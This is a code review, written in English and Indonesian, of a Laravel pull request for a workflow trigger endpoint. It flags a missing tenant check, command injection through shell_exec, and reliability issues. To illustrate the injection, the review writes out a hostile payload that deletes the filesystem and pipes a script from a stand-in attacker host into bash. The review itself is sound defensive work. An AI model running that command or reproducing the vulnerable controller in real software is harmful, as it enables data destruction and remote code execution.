# Code Review — FlowForge PR #42

## PR: "Add workflow trigger endpoint"

### Author: junior-dev
### Reviewer: Senior Engineer (me)

---

## Code Under Review

```php
<?php

namespace App\Http\Controllers;

use App\Models\Workflow;
use App\Models\WorkflowRun;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;

class WorkflowController extends Controller
{
    public function trigger(Request $request, $id)
    {
        $workflow = Workflow::find($id);
        
        $run = new WorkflowRun();
        $run->workflow_id = $workflow->id;
        $run->status = 'running';
        $run->started_at = now();
        $run->save();
        
        // Execute each step
        $steps = json_decode($workflow->definition);
        foreach ($steps as $step) {
            $result = $this->executeStep($step);
            DB::table('workflow_step_runs')->insert([
                'run_id' => $run->id,
                'step_id' => $step->id,
                'status' => $result ? 'success' : 'failed',
                'output' => $result
            ]);
        }
        
        $run->status = 'completed';
        $run->save();
        
        return response()->json(['run_id' => $run->id]);
    }
    
    private function executeStep($step)
    {
        if ($step->type == 'http') {
            $ch = curl_init($step->config->url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $response = curl_exec($ch);
            curl_close($ch);
            return $response;
        } elseif ($step->type == 'script') {
            return shell_exec($step->config->command);
        }
        return null;
    }
}
```

---

## Review Feedback

### 🔴 Critical Issues

#### 1. **TENANT ISOLATION MISSING** (Security — Critical)

```php
$workflow = Workflow::find($id);
```

**Problem**: Tidak ada tenant scoping. User dari Tenant A bisa trigger workflow milik Tenant B hanya dengan mengetahui ID-nya. Ini adalah **data breach vulnerability**.

**Fix**:
```php
$workflow = Workflow::where('tenant_id', $request->user()->tenant_id)
    ->findOrFail($id);
```

#### 2. **COMMAND INJECTION** (Security — Critical)

```php
return shell_exec($step->config->command);
```

**Problem**: Direct `shell_exec` dengan input dari database yang bisa dimanipulasi user. Jika user bisa memasukkan step definition, mereka bisa execute arbitrary commands di server: `"command": "rm -rf / && curl attacker.com/shell.sh | bash"`

**Fix**: 
- Gunakan whitelist predefined commands
- Jangan gunakan `shell_exec` langsung
- Implementasi sandbox atau predefined script registry
```php
$allowedCommands = ['data-sync', 'report-generate', 'cache-clear'];
if (!in_array($step->config->command, $allowedCommands)) {
    throw new UnsafeCommandException("Command not in whitelist");
}
```

#### 3. **SQL INJECTION RISK** (Security — High)

```php
DB::table('workflow_step_runs')->insert([
    'output' => $result  // Raw, unsanitized external response
]);
```

**Problem**: `$result` berasal dari external HTTP response yang tidak disanitize. Meskipun Laravel's query builder umumnya aman dari SQL injection karena parameterized queries, menyimpan raw external data tanpa sanitasi membuka XSS risk saat ditampilkan di frontend.

**Fix**: Sanitize output, set max length, dan validate type:
```php
'output' => substr(strip_tags($result ?? ''), 0, 65535),
```

#### 4. **NO INPUT VALIDATION** (Reliability — High)

```php
public function trigger(Request $request, $id)
// No validation at all
```

**Problem**: Tidak ada validation apakah:
- `$id` format valid (UUID)
- Workflow exists (akan NullPointerException di `$workflow->id`)
- User memiliki permission untuk trigger
- Workflow dalam state yang bisa di-trigger

**Fix**:
```php
public function trigger(TriggerWorkflowRequest $request, string $id)
{
    $this->authorize('trigger', $workflow);
    // ...
}
```

#### 5. **NO TRANSACTION / NO ERROR HANDLING** (Reliability — High)

```php
$run = new WorkflowRun();
$run->save();
// Steps execute...
// If step 3 fails, run stays "running" forever
$run->status = 'completed';
$run->save();
```

**Problem**: 
- Jika exception terjadi di tengah execution, run record stuck di status 'running' selamanya
- Tidak ada try/catch
- Tidak ada transaction untuk atomic data creation
- Tidak ada timeout mechanism

**Fix**:
```php
DB::beginTransaction();
try {
    $run = WorkflowRun::create([...]);
    // dispatch to queue instead of synchronous execution
    dispatch(new ExecuteWorkflowJob($run));
    DB::commit();
} catch (\Throwable $e) {
    DB::rollBack();
    $run?->markAsFailed($e->getMessage());
    throw $e;
}
```

---

### 🟡 Major Issues

#### 6. **SYNCHRONOUS EXECUTION** (Architecture — Major)

**Problem**: Seluruh workflow dijalankan secara synchronous dalam HTTP request. Jika workflow punya 10 steps masing-masing 30 detik, request akan timeout setelah 300 detik. User harus menunggu.

**Fix**: Dispatch ke queue, return run_id immediately:
```php
$run = WorkflowRun::create(['status' => 'pending']);
dispatch(new ExecuteWorkflowJob($run));
return response()->json(['run_id' => $run->id], 202); // 202 Accepted
```

#### 7. **NO DEPENDENCY RESOLUTION** (Logic — Major)

```php
foreach ($steps as $step) {
    $result = $this->executeStep($step);
}
```

**Problem**: Steps dieksekusi sequentially tanpa memperhatikan `depends_on`. DAG tidak di-resolve, sehingga steps yang bisa parallel dijalankan serial, dan dependency order tidak dijamin.

**Fix**: Implementasi topological sort dan parallel execution berdasarkan dependency levels.

#### 8. **RAW CURL USAGE** (Code Quality — Major)

```php
$ch = curl_init($step->config->url);
```

**Problem**: 
- Raw curl tanpa timeout → bisa hang indefinitely
- Tidak handle error responses
- Tidak support configurable headers/method
- Tidak log request/response untuk debugging

**Fix**: Gunakan Laravel HTTP client (Guzzle wrapper):
```php
$response = Http::timeout(30)
    ->withHeaders($step->config->headers ?? [])
    ->send($step->config->method, $step->config->url);
```

---

### 🟢 Minor Issues

#### 9. **POOR NAMING** (Code Quality)

- `$result` — too generic, should be `$stepOutput`
- `$id` — should be type-hinted as `string` with UUID validation
- `$steps` — confusing, could be `$stepDefinitions`
- `executeStep` — doesn't indicate it's synchronous and blocking

#### 10. **NO TESTS** (Quality)

Tidak ada test yang menyertai PR ini. Minimal harus ada:
- Unit test: trigger creates a run
- Integration test: tenant isolation
- Edge case: workflow not found, unauthorized access

#### 11. **MISSING TIMESTAMPS AND AUDIT FIELDS**

```php
DB::table('workflow_step_runs')->insert([...]);
```

Tidak ada `created_at`, `updated_at`, `started_at`, `finished_at`. Ini penting untuk monitoring dan debugging.

#### 12. **NO RETURN TYPE / STATUS CODE**

```php
return response()->json(['run_id' => $run->id]);
```

Harus return HTTP 202 (Accepted) karena ini async operation, bukan 200. Dan harus include lebih banyak context.

---

## Summary

| Severity | Count | Categories |
|----------|-------|------------|
| 🔴 Critical | 5 | Security (3), Reliability (2) |
| 🟡 Major | 3 | Architecture, Logic, Code Quality |
| 🟢 Minor | 4 | Naming, Tests, Data, HTTP |

**Verdict**: ❌ **Request Changes**

This PR has critical security vulnerabilities (tenant isolation bypass, command injection) and architectural issues (synchronous execution, no error handling) that must be resolved before merge. I'd recommend:

1. Fix all critical security issues
2. Move execution to queue-based async processing
3. Implement proper DAG resolution
4. Add tests covering tenant isolation and error cases
5. Re-submit for review

Happy to pair on the refactoring if helpful. The overall direction is right — we just need to harden it.
